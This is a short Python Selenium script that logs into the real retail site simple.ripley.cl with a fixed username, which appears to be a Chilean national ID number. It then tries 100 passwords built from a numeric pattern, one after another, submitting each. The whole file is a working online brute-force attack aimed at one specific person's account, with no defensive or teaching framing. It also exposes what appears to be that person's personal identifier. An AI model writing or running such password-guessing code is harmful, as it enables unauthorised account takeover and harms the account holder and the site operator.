from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


driver = webdriver.Chrome()
driver.get("https://simple.ripley.cl/")
driver.find_element_by_class_name('my-account').click()
time.sleep(1)
user = driver.find_element_by_name('ws_username')
user.send_keys("19477733-7")
for i in range(100):
    password = driver.find_element_by_name('password')
    password.clear()
    password.send_keys("10"+str(i)+"94"+str(i+10)+"6")
    password.send_keys(Keys.ENTER)
    time.sleep(2)

driver.quit()